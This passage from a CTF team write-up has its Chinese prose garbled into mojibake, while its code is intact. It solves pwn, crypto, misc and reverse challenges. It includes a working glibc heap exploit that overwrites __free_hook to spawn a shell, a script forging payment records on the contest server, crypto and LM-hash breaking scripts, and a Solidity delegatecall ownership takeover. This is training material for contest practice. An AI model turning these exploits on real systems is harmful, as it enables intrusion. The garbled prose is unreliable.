ˆæº¢å‡º+æ²™ç›’orw![image-20210130171347058](https://i.loli.net/2021/01/30/HgNusO9G1jZrqQF.png)\n\nè§2020_9æœˆåšå®¢ ==> [vmpwn](https://ld1ng.com/2020/09/28/Sep_Match/#0x01-gactf-vmpwn)\n\n## 5.pwn8\n\nåˆ©ç”¨uafæ¼æ´ï¼Œåˆ†å‰²unsortedbinï¼Œé€šè¿‡æ„é€ è·å¾—fastbinï¼Œæ²¡æœ‰è¾“å‡ºå‡½æ•°ï¼Œçˆ†ç ´stdoutæ³„éœ²libcåŸºå€ï¼Œæœ€åå°†fdæ”¹ä¸ºmalloc_hook-0x23ï¼Œä»è€Œå°†malloc_hookæ”¹ä¸ºonegadget getshell\n\n![image-20210130170848487](https://i.loli.net/2021/01/30/vCypuJcw3iakYhd.png)\n\nè¯¦ç»†è§2020_11æœˆåšå®¢==> [ä¸Šæµ·èµ›wp](https://ld1ng.com/2020/11/30/Nov_Match/#0x05-%E4%B8%8A%E6%B5%B7%E8%B5%9B-maj0rone)\n\n## 6.babyheap\n\nä¸»è¦åœ¨äºtcacheå—çš„æ„é€ ï¼Œå°è¯•äº†å¥½å‡ ç§æ€è·¯éƒ½å¤±è´¥äº†ï¼Œå¹¶æ²¡æ‰¾åˆ°ç‰¹åˆ«å–å·§çš„æ€è·¯\n\næœ¬é¢˜ç‰¹ç‚¹åœ¨äºç”¨reallocåˆ†é…ï¼Œå¹¶ä¸”åªæœ‰ä¸€ä¸ªå…¨å±€å˜é‡å­˜å‚¨ï¼Œæ‰€ä»¥addå’Œdeleteæ€»æ˜¯è¦æˆå¯¹å‡ºç°\n\næ¼æ´åœ¨addæ—¶æœ‰ä¸ªoffbyoneï¼Œæ‰€ä»¥å¯ä»¥æ„é€ å †é‡å ï¼Œç„¶åé€šè¿‡ä¸€ç³»åˆ—çš„overlapæ¥ä¿®æ”¹fdæŒ‡é’ˆå¹¶ç”³è¯·åˆ°stdoutï¼Œçˆ†ç ´æ³„éœ²å‡ºlibcåŸºå€ï¼Œå› ä¸ºæˆ‘ä»¬å…³é—­äº†stdoutï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç”¨è¾“å‡ºé‡å®šå‘ 1>&2ï¼Œç„¶åä¿®æ”¹free_hookä¸ºsystemå³å¯\n\n```python\n# encoding=utf-8\nfrom pwn import *\nelf = ELF('./babyheap')\n# context.log_level = \"debug\"\nlibc = ELF('/home/ld1ng/tools/glibc-all-in-one-master/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so')\n\ndef add(size, content=\"\\n\"):\n    p.sendlineafter(\"choice:\", \"1\")\n    p.sendlineafter(\"Size:\", str(size))\n    p.sendafter(\"Data:\", content)\n\ndef delete():\n    p.sendlineafter(\"choice:\", \"1\")\n    p.sendlineafter(\"Size:\", str(0))\n\ndef add2(size, content=\"\\n\"):\n    p.sendline(\"1\")\n    sleep(0.1)\n    p.sendline(str(size))\n    sleep(0.1)\n    p.send(content)\n    sleep(0.1)\n\ndef delete2():\n    p.sendline(\"1\")\n    sleep(0.1)\n    p.sendline(str(0))\n    sleep(0.1)\n\ndef colse1():\n    p.sendlineafter(\"choice:\", \"2\")\n\nDSZIE = 0x4f0\nwhile True:\n    p = elf.process()\n    # p  = remote('219.219.61.234',20030)\n    for i in range(6):\n        add(DSZIE)\n        add(0x80)\n        delete()\n\n    add(DSZIE)\n    add(0xa8)\n    delete()\n\n    add(DSZIE)\n    add(0x80)\n    delete()\n\n    add(DSZIE)\n    add(0x28)\n    delete()\n\n    add(DSZIE)\n    add(0x28)\n    delete()\n\n    add(DSZIE)\n    add(0x48)\n    delete()\n\n    add(DSZIE)\n    add(0x28)\n    delete()\n\n    add(0x3c0)\n    add(0x80)\n    delete()\n    #unsortedbin\n    add(0xa8, \"a\" * 0xa8 + \"\\xf1\")\n    delete()\n\n    add(0x88)\n    delete()\n    # gdb.attach(p)\n    add(0xe8, \"a\" * 0x98 + p64(0x21) + \"\\x00\" * 0x18 + p64(0x21) + \"\\xe0\")\n    delete()\n\n    add(0x48, \"a\" * 0x48 + \"\\xc1\")\n    delete()\n    add(0x28)\n    delete()\n    add(0xb8, \"a\" * 0x28 + p64(0x91) + '\\x60\\x07\\xdd')\n    delete()\n    gdb.attach(p)\n    add(0xe8, \"a\" * 0x98 + p64(0x21) + \"\\x00\" * 0x18 + p64(0x41))\n    delete()\n\n    add(0x28)\n    delete()\n    add(0x28)\n    delete()\n    try:\n        add(0x28, p64(0xfbad3887) + p64(0) * 3 + \"\\x00\")\n        p.recvuntil(p64(0xfbad3887), timeout=1)\n        # gdb.attach(p)\n        p.recv(0x18)\n        libc_base = u64(p.recv(8)) - 0x3ec700\n        libc.address = libc_base\n        info (\"libc_base : \" + hex(libc.address))\n        if \"\\x7f\" in p64(libc.address):\n            break\n    except EOFError:\n        p.close()\n        continue\ncolse1()\np.recvuntil(\"Bye\")\npayload = \"a\" * 0x98 + p64(0x21) + \"\\x00\" * 0x18 + p64(0x61) + p64(libc.sym['__free_hook'] - 0x18) + b\"\\n\"\nadd2(0xe8, payload)\ndelete2()\n\nadd2(0x38)\ndelete2()\npayload2 = \"exec /bin/sh 1>&2\\0\".ljust(0x18, \"\\x00\") + p64(libc.sym['system']) + \"\\n\"\nadd2(0x38, payload2)\ndelete2()\n\np.interactive()\n```\n\nçˆ†ç ´ä¸¤ä½1/256çš„æ¦‚ç‡ï¼Œè„¸å¤ªé»‘äº†è¿œç¨‹æ²¡çˆ†å‡ºæ¥ï¼Œä¸è¿‡æœ¬åœ°æµ‹è¯•æˆåŠŸ\n\n![image-20210131014951959](https://i.loli.net/2021/01/31/dRuBJ37qPSZATHE.png)\n\n***referenceï¼š***\n\n[æ¹–æ¹˜æ¯2020wp](https://www.anquanke.com/post/id/221334#h2-2)\n\n## 7.pwnserver\n\nä¸€é“æ¨¡æ‹ŸæœåŠ¡å™¨çš„é¢˜ç›®\n\næœ¬æ¥æ˜¯æƒ³æŠŠptrace(PTRACE_TRACEME, 0, 0, 0)åè°ƒè¯•å…³æ‰çš„ï¼ŒPIEä¹Ÿå…³æ‰ï¼Œæ”¾å‡ºæ¥ç©ç©çš„ï¼Œç»“æœä¸çŸ¥é“æ˜¯dockerfileæœ‰é—®é¢˜è¿˜æ˜¯ç¯å¢ƒæœ‰é—®é¢˜ï¼Œè‡ªå·±è¿œç¨‹éƒ½æ²¡æ‰“é€šï¼Œå†åŠ ä¸Š7å¤©å¤§å®¶åº”è¯¥éƒ½ç´¯äº†ï¼Œå°±æ²¡æ”¾\n\n# 0x02 CRYPTO\n\n## 1.ç®€å•çš„RSA\n\n```python\nfrom Crypto.Util.number import *\nfrom secret import flag\ndef keygen(nbit):\n    while True:\n        p, q, r = [getPrime(nbit) for i in range(3)]\n        if isPrime(p + q + r):\n            pkey = (p * q * r, p + q + r)\n            privtekey = (p, q, r)\n            return pkey, privtekey\ndef encrypt(msg, pubkey):\n    enc = pow(bytes_to_long(msg.encode('utf-8')), 4097, pkey[0] * pkey[1])\n    return enc\n\npkey, _ = keygen(512)\nenc = encrypt(flag, pkey)\nprint('pkey =', pkey)\nprint('enc =', enc)\n```\n\né ç€Googleçš„åŠ›é‡\n\n![image-20210125222440426](https://i.loli.net/2021/01/25/6AzThEMr4YnIcdB.png)\n\næ€»çš„æ¥è¯´å°±æ˜¯å¦‚æœflagè¶³å¤Ÿå°ï¼Œä»¥è‡³äºå¯ä»¥è®¤ä¸ºèƒ½å¤Ÿåªç”¨key2(p+q+rè´¨å› å­)è§£å¯†ï¼Œè¿™æ ·å°±æ˜¯å¯ä»¥å¾ˆå¿«è§£å‡ºç­”æ¡ˆ\n\nè„šæœ¬å¦‚ä¸‹\n\n```python\nfrom Crypto.Util.number import *\n\npubkey = (1251709577626510958494791062667676243734790366011491246986675733462349082344175537453771621121071766669797697717917746631186730725083409823551331041259926857211364206399038556008882780372855437508183600896784538740213036545604184332069924635733237483487108196741742913693788926280985195680223402990853248300811764270645645433228544946675281537724600096480759192450265887279376728709415106679135570449965771369087189818628308500388459719506931876195584599535690337, 33168381182273613039378043939021834598473369704339979031406271655410089954946280020962013567831560156371101600701016104005421325248601464958972907319520487)\nenc = 15648371218931722790904370162434678887479860668661143723578014419431384242698608484519131092011871609478799077215927112238954528656254346684710581567304227780228595294264728729958171950314042749100472064919234676544341981418897908716041285489451559413615567610248062182987859379618660273180094632711606707044369369521705956617241028487496003699514741969755999188620908457673804851050978409605236834130689819372028797174206307452231481436775711682625666741103384019125790777595493607264935529404041668987520925766499991295444934206081920983461246565313127213548970084044528257990347653612337100743309603015391586841499\n\nd = inverse(0x1001, pubkey[1]-1)\nprint(long_to_bytes(pow(enc, d, pubkey[1])))\n#CUMTCTF{54def9aa832be5c6e77d213c6d5}\n```\n\n## 2.ä¹±å†™çš„å¯†ç \n\näººè¦çœ‹å‚»äº†ï¼Œ@æ–‡æ¡‘\n\nç¨‹åºé€»è¾‘å°±æ˜¯éšæœºç¼–æ’äº†å­—æ¯è¡¨ï¼Œå®åœ¨æ²¡æƒ³å‡ºæ–¹æ³•ï¼Œè¯•è¯•ç»Ÿè®¡åˆ†æ\n\nçœ‹åˆ°`krveked{fwgzszymyeu_eql0wu1trtldrm}`\n\nç›²çŒœå¼€å¤´æ˜¯cumtctfï¼Œç„¶åæ ¹æ®æ­£æ–‡çš„åŒå­—æ¯åŠä¸‰å­—æ¯çš„ç»„åˆçŒœæµ‹å¯¹åº”å…³ç³»\n\nå¾—åˆ°flag: `cumtctf{probability_the0ry1suseful}`////åè¡€\n\næ–¹æ³•å¤ªè ¢äº†ï¼Œåç­‰å®˜æ–¹wp...\n\n------\n\nç ´æ¡ˆäº†ï¼Œæœç„¶æœ‰å·¥å…·ï¼š[è¯é¢‘åˆ†æ](https://quipqiup.com/)\n\n## 3.å‡ºæ¥ç­¾åˆ°å•¦\n\nä¸¤å…³ï¼Œç¬¬ä¸€å…³æ˜¯AES_CBCï¼Œåˆšå¥½æœ€è¿‘è€ƒå®Œå¯†ç å­¦\n\n```python\nkey = \"19e6855d293a1b76ff44f18948b19bad\"\nplainText = \"Can_You_Find_me?\"\nIV=?\nflag=?\naes = AES.new(key, AES.MODE_CBC, iv)\naes1 = AES.new(key, AES.MODE_CBC, iv)\ncipherText1=aes.encrypt(plainText)\ncipherText=aes1.encrypt(flag)\n#flagä¸ºä¸‹ä¸€å…³çš„å¯†ç \n```\n\nç°åœ¨å·²çŸ¥cipherTextã€cipherText1å’Œkeyï¼Œåªè¦æ±‚å‡ºIVå³å¯å¾—åˆ°flag\n\nè¿™é‡Œå¯ä»¥å›é¡¾ä¸€ä¸‹åˆšåˆšè¿‡å»çš„å¯†ç å­¦è¯¾æœ¬ï¼Œå†™å‡ ä¸ªå¼å­ç›´è§‚ä¸€ç‚¹ï¼Œ\n\n$$\nC1 = E(P1 âŠ• IV)\\\\\\P1 = D(C1) âŠ• IV\n$$\n\n\nè¿™é‡Œæˆ‘ä»¬è¦åšçš„æ˜¯ä¼ªé€ ä¸€ä¸ªfakeIVï¼Œå¯å¾—\n$$\nfakeP = D(C1) âŠ• fakeIV\\\\\\D(C1) = fakeP âŠ• fakeIV\\\\\\âˆµ D(C1) = P1 âŠ• IV\\\\\\âˆ´ IV = fakeP âŠ• fakeIV âŠ• P1\n$$\n\næ‰€ä»¥è„šæœ¬å¦‚ä¸‹ï¼š\n\n```python\nfrom Crypto.Cipher import AES\n\nkey = \"19e6855d293a1b76ff44f18948b19bad\".decode(\"hex\")\ncipherText1 = \"97FB685D28FC895BB1617CDA1E6C4D76\".decode(\"hex\")\ncipherText = \"D0EC67CCCF6B2BB057C4FAA168FA670C12CBB3D5D058968FF60426F95344A84B\".decode(\"hex\")\n# print type(cipherText1)\n# print cipherText\nplainText = \"Can_You_Find_me?\"\nfakeIV = \"0123456789abcdef\"\nfAes = AES.new(key, AES.MODE_CBC, fakeIV)\nfakeP = fAes.decrypt(cipherText1)\niv = \"\"\nfor i in range(16):\n   iv += chr(ord(fakeP[i])^ord(fakeIV[i])^ord(plainText[i]))\naes = AES.new(key, AES.MODE_CBC, iv)\nflag = aes.decrypt(cipherText)\nprint flag\n#key{OhOh_You_Find_It}!!!!!!!!!!!\n```\n\nè¾“å…¥å£ä»¤OhOh_You_Find_Itï¼Œæ‰“å¼€challenge2\n\næ˜¯ä¸€ä¸ªçº¿æ€§åé¦ˆç§»ä½å¯„å­˜å™¨ï¼Œ\n\n```python\nflag = \"bxsyyds{xxxxxxx}\nassert flag.startswith(\"bxsyyds{\")\nassert flag.endswith(\"}\")\nassert len(flag)==16\n\ndef lfsr(R,mask):\n    output = (R << 1) & 0xfffffff\n    i=(R&mask)&0xfffffff\n    lastbit=0\n    while i!=0:\n        lastbit^=(i&1)\n        i=i>>1\n    output^=lastbit \n    return (output,lastbit)\n\nR=int(flag[8:-1],16)\nmask=0b1001000000100000001000100101\nf=open(\"result\",\"w\")\nfor i in range(100):\n    tmp=0\n    for j in range(8):\n        (R,out)=lfsr(R,mask)\n        tmp=(tmp << 1)^out\n    f.write(chr(tmp))\nf.close()\n```\n\nç®€å•æ¥è¯´å°±æ˜¯æ¯ä¸€æ—¶åˆ»çš„åºåˆ—ä¸maskæŒ‰ä½ä¸ä¹‹åçš„ç»“æœé€ä½å¼‚æˆ–ï¼Œæ”¾åœ¨åºåˆ—æœ«å°¾ï¼Œé¦–å­—æ¯è¾“å‡ºï¼Œå°±è¿™æ ·æ¯8ä½è¾“å‡ºä¸€ä¸ªå­—èŠ‚å†™å…¥resultï¼Œå…±100ä¸ªå­—èŠ‚\n\nå¾ˆæ˜æ˜¾å¯„å­˜å™¨é•¿åº¦ä¸º28ï¼ˆ7ä¸ªå­—èŠ‚ï¼‰ï¼Œå¹¶ä¸”å¾ˆå®¹æ˜“å¾—åˆ°åé¦ˆå‡½æ•°ï¼Œ(1&any = any ; 0^any = any )\n\næ‰€ä»¥lastbitå®è´¨ä¸Šå°±æ˜¯å½“å‰åºåˆ—å¯¹åº”maskä½çš„å€¼è¿›è¡Œå¼‚æˆ–ï¼Œè€Œæˆ‘ä»¬å·²çŸ¥è¾“å‡ºåºåˆ—çš„å‰27ä½ï¼Œå³å¯æ±‚å‡ºflagçš„æœ€åä¸€ä½ï¼Œä»¥æ­¤ç±»æ¨ï¼Œæœ€åå³å¯å¾—åˆ°å®Œæ•´flag\n\n```python\nmask = '1001000000100000001000100101'\nresult = '1000000101111010010001111100'\n\ntmp = result\nR = ''\nfor i in range(28):\n    output = '0' + result[:27]\n    lastbit = int(tmp[-1-i])^int(output[-1])^int(output[-3])^int(output[-6])^int(output[-10])^int(output[-18])^int(output[-25])\n    R += str(lastbit)\n    result = str(lastbit) + result[:27]\n\nR = hex(int(R[::-1],2))[2:]\nflag = \"cumtctf{\" + R + \"}\"\nprint flag\n#cumtctf{5201314}\n```\n\n## 4.fakeRSA\n\né¢˜ç›®æè¿°\n\n```python\nfrom Crypto.Util.number import *\n\np = getPrime(1024)\nq = getPrime(1024)\nn = p * q\nphi = (p - 1) * (q - 1)\ne = 65537\n\nwith open('./flag.txt', 'r') as r:\n    flag = r.read()\nflag = flag.split(' ')\ncipher = []\nfor word in flag:\n    tmp_cipher = []\n    for char in word:\n        tmp_cipher.append(pow(ord(char), e, n))\n    cipher.append(tmp_cipher)\n\nwith open('./cipher.txt', 'w+') as w:\n    w.write('cipher = ' + str(cipher))\n    w.write('\\nn = ' + str(n))\n    w.write('\\ne = ' + str(e))\n    w.write('\\nä¼—æ‰€å‘¨çŸ¥ï¼ŒRSAå±äºå…¬é’¥å¯†ç ç®—æ³•ï¼Œé‚£ä¹ˆåŠ è§£å¯†å°±åªéœ€è¦ç”¨åˆ°å…¬é’¥ï¼Œæ²¡æœ‰ä»€ä¹ˆé—®é¢˜')\n```\n\ncipheræ˜¯ä¸ªäºŒç»´æ•°ç»„ï¼Œä¸¤ä¸¤ä¸€ç»„ï¼Œå¾ˆå¥‡æ€ªï¼ˆå…¶å®å°±æ˜¯å¯¹æ˜æ–‡æ¯ä¸ªå­—æ¯åˆ†åˆ«åŠ å¯†ï¼‰\n\næ²¡ç®¡é‚£ä¹ˆå¤šï¼Œç›´æ¥å¯¹æ‰€æœ‰å¯†æ–‡çˆ†ç ´\n\nåœ¨å¯è§å­—ç¬¦èŒƒå›´å†…ï¼Œæ•°é‡å¹¶ä¸å¤š\n\nè„šæœ¬å¦‚ä¸‹ï¼š\n\n```python\nn = 12457981652507620082899382981019023150522130836049180768230343208048934250515055225919349467798787130145322363535840724320789633007392777695461819640437560640209852226105362332801576692429778616279117389786582662174560154469003170305006785551902344355335769435756760811102857819829329033582792826564656344565450265474296871162147060177241714540253604539780517460406770813062769099245157298730033826355717057929207255864286698539967655185399554949075313213370119868838885318633758295272070101734349060701723266336600294581259003531484934286818352843046724120072304901058035864828216652283864232249168467598307241102541\ne = 65537\nwith open('1.txt' , 'r') as f:\n    c = f.read().split(',')\nc = [int(i) for i in c]\nflag = ''\nfor cipher in c:\n    for i in range(48,127):\n        if pow(i , e , n) == cipher:\n            flag += chr(i)\n            break\nprint(flag)\n```\n\n![image-20210128001412466](https://i.loli.net/2021/01/28/YOsM76tIXfFroPC.png)\n\n\n\n## 5.Pocketbook\n\nnc è¿‡å»\n\n```python\n[$] Welcome to CUMTCTF'winter\n[+] sha256(AuQVuDXG+?).binary.endswith('00000')\n[-] ?=\n```\n\nsha256åªçˆ†ç ´æœ€åä¸€ä½å³å¯ï¼Œé€šè¿‡éªŒè¯åè¿›å…¥æ˜¯ä¸€ä¸ªäº¤æ˜“ç³»ç»Ÿ\n\n```c\n1. Transfer //äº¤æ˜“\n2. View transaction information  //æŸ¥çœ‹äº¤æ˜“å•å·\n3. Submit transaction information to me  //æäº¤å•å·\n4. get flag(pay 10000)  //ä¹°flag\n```\n\nå‡ºç”Ÿ10å—é’±ï¼Œèµšå¤Ÿ10000å°±å¯ä»¥ä¹°flag\n\nè¿™é‡Œè¦åšæ˜¯å°±æ˜¯ä¼ªé€ å•å·ï¼Œ48ä½çš„å•å·16ä½ä¸€ç»„å¯ä»¥åˆ†ä¸º3ç»„ï¼Œåˆ†åˆ«æ˜¯sender/receiver/amount\n\nå¯ä»¥å…ˆè‡ªå·±ç»™ljzjscè½¬10å—é’±ï¼Œç„¶åè·å¾—è‡ªå·±çš„å•å·ï¼Œç„¶ååœ¨çœ‹å…¶ä»–å•å·åˆ†åˆ«æˆªå–ä¸‹æ¥ï¼Œå°±å¯ä»¥æ‹¼å‡‘å‡ºæ–°çš„ä¼ªé€ å¥½çš„å•å·ï¼Œç„¶ååå¤æäº¤ï¼Œç›´åˆ°èµšå¤Ÿ10000å³å¯\n\næ€è·¯å¾ˆç®€å•ï¼Œè„šæœ¬å¦‚ä¸‹\n\n```python\nimport hashlib\nfrom pwn import *\n# context.log_level = 'debug'\np = remote('219.219.61.234',20040)\np.recvuntil('(')\nm = str(p.recv(8))\n# print m\ndic=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"\nfor i in dic:\n    s = m+i\n    h=str(bin(int(hashlib.sha256(s).hexdigest(),16))[2:])\n    if h.endswith('00000'):\n        print(i)\n        p.sendline(i)\n        break\np.recvuntil('name')\nprint('login success')\np.sendline('ld1ng')\np.sendline('1')\np.sendline('ljzjsc')\np.sendline('10')\np.recvuntil('hash:')\nrecord = str(p.recv()).strip('\\n')\nrecevier = record[:16]\n\np.sendline('2')\nrecord = str(p.recvline())\nfakerecord = ''\nfakerecord+=record[:16] + recevier + record[32:]\nprint \"sender: \" + record[:16]\nprint 'recevier: '+ recevier\nprint 'amount: '+ record[32:]\nprint \"fakerecord: \" + fakerecord\n\nwhile(1):\n    p.recvuntil(\"Account Balance:\")\n    balance = p.recvline()\n    print balance\n    p.sendline('3')\n    p.send(fakerecord)\n    if(int(balance)>=10000):\n        break\np.interactive(\"$ld1ng\")\n```\n\nåç­‰ä½™é¢å˜ä¸º10000å°±è¡Œ\n\n![image-20210128185332741](https://i.loli.net/2021/01/28/yPdVivzpHL7rAJ3.png)\n\n## 6.ezRSA\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom secret import *\n\n# tipï¼š 2*x*y*beta + x + y\nif is_prime(beta) and len(bin(beta)[2:]) == 512:\n    if len(bin(x)[2:]) == len(bin(y)[2:]) :\n        p = 2 * x * beta + 1\n        q = 2 * y * beta + 1\n        if is_prime(p) and is_prime(q):\n            n = p * q\n            e = 65537\n            m = bytes_to_long(flag.encode())\n            enc = powmod(m, e, n)\n            print(n)\n            print(e)\n            print(beta)\n            print(enc)\n# n=\n# e=\n# beta=\n# enc=\n```\n\nè¿™é‡Œå¯ä»¥å¾—åˆ°è¿™äº›ç­‰ä»·å…³ç³»\n\n\n$$\nn=pq=4xyÎ²^2+2xÎ²+2yÎ²+1\\\\\\tip = 2xyÎ² + x + y\\\\\\âˆ´tip = n-1/2Î²\\\\\\tip â‰¡ x+y(mod Î²) = x+y+kÎ²\n$$\n\næ‰€ä»¥ï¼Œå¯ä»¥çˆ†ç ´kå¾—å‡ºxï¼Œyçš„å€¼ï¼Œè¿›è€Œå¾—åˆ°*Ï†*(*n*)\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nn =\ne = 65537\nenc = \nbeta =\ntip = (n-1)//(2*beta)\nfor k in range(10000):\n    x_add_y = tip % beta + beta*k\n    x_mul_y = (tip - x_add_y)//(2*beta)\n    try:\n        x_sub_y = iroot(x_add_y**2 - 4*x_mul_y,2)\n        if x_sub_y[1]:\n            y = (x_add_y - x_sub_y[0] )//2\n            x = x_add_y - y\n            p = 2*y*beta + 1\n            q = 2*x*beta + 1\n            phi = (p-1)*(q-1)\n            d = inverse(e,int(phi))\n            print (long_to_bytes(pow(enc,d,n)))\n    except:\n        pass\n#CUMTCTF{2cbbebe1-79d1-4733-8a8f-53f4396476d3}\n```\n\n# 0x03 MISC\n\n## 1.å¤§é¸Ÿè½¬è½¬è½¬\n\ngifå›¾ç‰‡ï¼Œç”¨å·¥å…·ä¸€å¸§ä¸€å¸§ç¿»å°±è¡Œ\n\n![image-20210125225811863](https://i.loli.net/2021/01/25/6ho5a3IMmc4LxVH.png)\n\nè¯è¯´ï¼Œå°‘äº†ä¸ªFè°å‘ç°äº†ï¼\n\n## 2.æ²¡åˆ«çš„æ„æ€ç»™ä½ ç­¾ä¸ªåˆ°é¡ºä¾¿ç»™ä½ çœ‹çœ‹æˆ‘è€å©†\n\nä¸ç”¨çœ‹éƒ½çŸ¥é“æ˜¯è°å‡ºçš„é¢˜å•Šå–‚@ljzjsc\n\n![image-20210125230306456](https://i.loli.net/2021/01/25/rALxnbogtIp9VKB.png)\n\n## 3.ç¨‹åºè½¯ä»¶å·¥ç¨‹å¸ˆ\n\nbase64éšå†™ï¼Œéƒ½æ˜¯è„šæœ¬çš„é”…ï¼Œå®³å¾—æˆ‘åŠ¨è°ƒäº†åŠå¤©\n\n![image-20210127190129651](https://i.loli.net/2021/01/27/TSa1Kf7GCOm8lYZ.png)\n\n## 4.å¤œä¹‹åŸä¹‹ç‹\n\nVå“¥äº²è‡ªå½•è§†é¢‘ï¼Œä¸€å¼€å§‹å°±æ˜¯lmhashçˆ†ç ´ï¼Œä½†æ˜¯36çš„14æ¬¡æ–¹å¤ªå¤§äº†ï¼Œæˆ‘çš„å°ç”µè„‘åƒä¸æ¶ˆï¼Œäºæ˜¯æ”¾å¼ƒäº†\n\nå¥½åœ¨å‡ºé¢˜äººç»™äº†6ä½çš„æç¤ºï¼Œå†åŠ ä¸Šæœ¬äºº0.5å€é€Ÿçš„ç»†å¿ƒè§‚å¯Ÿï¼Œå¾ˆå®¹æ˜“æ‰¾åˆ°ä¸€äº›çº¿ç´¢ï¼Œäºæ˜¯3ä¸ªå­—çš„çˆ†ç ´å¯ä»¥è¯´ç§’å‡ºç»“æœğŸ˜‚\n\n```python\nimport passlib.hash;\ndic = \"1234567890QWERTYUIOPASDFGHJKLZXCVBNM\"\nm = ''\nfor a in dic:\n    for b in dic:\n        for c in dic:\n                m =\"1999FLAG\"+a+b+c+\"7er\"\n                if(passlib.hash.lmhash.encrypt(m)==\"32b2e7cfe24f673139251c6f310dee73\"):\n                    print(\"passwd is : \" + m)\n                    print(\"success!\")\n                    exit(0)                                              \nprint(\"NO RESULT\")\n#passwd is :1999FLAG1227er\n```\n\n## 5.helloBlockchain\n\næ™ºèƒ½åˆçº¦çš„äº¤äº’ï¼Œå¼€å§‹æˆ‘çš„é’±åŒ…æ²¡é’±ä¸€ç›´æ— æ³•éƒ¨ç½²ï¼Œå¤šäºljzjscæ¨èäº†ä¸€ä¸ªæ–°çš„æ°´é¾™å¤´\n\n![image-20210129100729118](https://i.loli.net/2021/01/29/CoYjzD2mqBuJOWE.png)\n\næˆ‘çš„é’±åŒ…æ‰ç»ˆäºæœ‰äº†ä¸€å—é’±\n\n![image-20210129100855009](https://i.loli.net/2021/01/29/jgsBYV3ioDATE9a.png)\n\nç„¶åé¢˜ç›®æ˜¯è¿™æ ·çš„ï¼Œç»™äº†æºç ï¼Œ\n\n```c\npragma solidity ^0.5.13;\n\ncontract HelloWorld {\n    string hello = \"Welcome to cumtctfwinter!!! You will find this so easy ~ Happy happy :D\";\n    event SendFlag(string email);\n    function getflag(string memory email) public returns(string memory){\n        emit SendFlag(email);\n        return hello;\n    }\n}\n```\n\ngetflagæ–¹æ³•ä¼ å…¥å‚æ•°(è¿™é‡Œæ˜¯é‚®ç®±)ï¼Œå°±å¯ä»¥è§¦å‘SendFlagäº‹ä»¶ï¼Œå°±å¯ä»¥å¾—åˆ°flagäº†\n\né¦–å…ˆè¦éƒ¨ç½²è‡ªå·±çš„åˆçº¦ï¼Œç„¶ååœ¨At Addresså¤„å¡«å…¥ç›®æ ‡åˆçº¦\n\n![image-20210129101518304](https://i.loli.net/2021/01/29/w9mRItuYhPaMV5T.png)\n\nå¯ä»¥å»æŸ¥çœ‹ç›®æ ‡åˆçº¦çš„äº¤æ˜“è®°å½•ï¼Œ\n\n![image-20210129101755349](https://i.loli.net/2021/01/29/Go7wHAlTC6chxZp.png)\n\næˆåŠŸååˆ°è‡ªå·±é‚®ç®±æŸ¥çœ‹å³å¯\n\n![image-20210129101207405](https://i.loli.net/2021/01/29/RlTj1XVCnx8vsiG.png)\n\n## 6.easyblock\n\nåŒæ ·çš„ç¯å¢ƒï¼Œä¹Ÿæä¾›äº†åˆçº¦æºç \n\n```c\npragma solidity ^0.4.23;\ncontract hanker {\n  address public owner;\n  address public nameContract;\n  uint hellocumtname;\n  string hello = \"Welcome to cumtctfwinter!!! You will find this so easy ~ Happy happy :D\";\n  event SendFlag(string email);\n  bytes4 constant set = bytes4(keccak256(\"changename(uint256)\"));\n  constructor() public {\n    nameContract = 0x746C5707Bfd8a4Be44332F21AC78A28e9340a9F4; \n    owner = msg.sender;\n  }\n\n  function getflag(string memory email) public{\n        require(msg.sender == owner);\n        emit SendFlag(email);\n    }\n  \n  function setname(uint _namenow) public {\n    nameContract.delegatecall(set, _namenow);\n  }\n}\n \ncontract nameContract {\n  uint hellocumtname;\n  function changename(uint _name) public {\n    hellocumtname = _name;\n  }\n}\n```\n\nè¿™é‡Œçš„å±é™©å‡½æ•°æ˜¯delegatecall\n\n`delegatecall:`è°ƒç”¨åå†…ç½®å˜é‡`msg` çš„å€¼ä¸ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼Œä½†æ‰§è¡Œç¯å¢ƒä¸ºè°ƒç”¨è€…çš„è¿è¡Œç¯å¢ƒã€‚ï¼ˆç›¸å½“äºå¤åˆ¶è¢«è°ƒç”¨è€…çš„ä»£ç åˆ°è°ƒç”¨è€…åˆçº¦ï¼‰\n\nå‡ºé¢˜äººæ˜¯è¿™æ ·è§£é‡Šçš„ï¼š\n\n![image-20210129212600390](https://i.loli.net/2021/01/29/zumxURvLlo1dgQW.png)\n\n\n\næ‰€ä»¥è¯´å½“è°ƒç”¨nameContractåˆçº¦çš„changenameæ—¶ï¼Œæ”¹å˜çš„å¹¶ä¸æ˜¯æœ¬åˆçº¦å†…çš„hellocumtnameå˜é‡ï¼Œè€Œæ˜¯å°†owneråœ°å€æ”¹å˜(æˆ‘ä»¥ä¸ºè¦æƒ³åŠæ³•æ‰§è¡Œæ„é€ å‡½æ•°æ‰€ä»¥ä¸€ç›´åœ¨å°è¯•åˆçº¦å®ä¾‹åŒ–)ï¼Œ\n\né‚£æ—¢ç„¶è¿™æ ·å°±å¯ä»¥é€šè¿‡changenameæ–¹æ³•è¾“å…¥è‡ªå·±çš„åœ°å€ï¼Œè¿™æ ·ownerå˜é‡å°±è¢«æˆ‘ä»¬ä¿®æ”¹äº†\n\nç„¶åæ‰§è¡Œgetflagæ–¹æ³•å³å¯ã€‚\n\npsï¼šå½“æ—¶æ²¹ä¸å¤Ÿæ€ä¹ˆä¹Ÿå‘ä¸å‡ºå»ï¼Œç„¶åæäº†limitä¹‹åå°±å¯ä»¥äº†\n\n![image-20210129211902253](https://i.loli.net/2021/01/29/uKGIMtUTB3EA4h5.png)\n\n## 7.backdoor\n\nwiresharkæŠ“åŒ…å°±è¡Œï¼Œflagæ˜¯ä¸ªipåœ°å€\n\n# 0x04 REVERSE\n\n## 1.re1\n\n![image-20210126180032593](https://i.loli.net/2021/01/26/467tHom8j2AgWBb.png)\n\nå…³é”®å‡½æ•°ï¼Œå¾ˆæ˜æ˜¾çš„base58çš„ç‰¹å¾ï¼Œç›´æ¥å·¥å…·è§£\n\n![image-20210126180126919](https://i.loli.net/2021/01/26/pxtMrIgjAPNEwGR.png)\n\n## 